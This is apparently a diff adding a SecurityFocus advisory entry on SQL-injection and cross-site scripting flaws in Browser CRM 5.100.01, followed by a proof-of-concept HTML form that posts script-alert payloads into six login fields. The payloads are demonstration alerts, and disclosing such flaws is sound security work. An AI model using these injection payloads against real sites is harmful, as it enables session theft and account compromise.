@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/51060/info
+      
+Browser CRM is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+      
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+      
+Browser CRM 5.100.01 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/index.php" method="post">
+<input type="hidden" name="loginwww.example.com" value=&#039;"><script>alert(1);</script>&#039;>
+<input type="hidden" name="login[password]" value=&#039;"><script>alert(2);</script>&#039;>
+<input type="hidden" name="login[rebuild_cache]" value=&#039;"><script>alert(3);</script>&#039;>
+<input type="hidden" name="login[remember_me]" value=&#039;"><script>alert(4);</script>&#039;>
+<input type="hidden" name="login[skin]" value=&#039;"><script>alert(5);</script>&#039;>
+<input type="hidden" name="login[username]" value=&#039;"><script>alert(6);</script>&#039;>
+<input type="submit" value="submit" id="btn">
+</form>
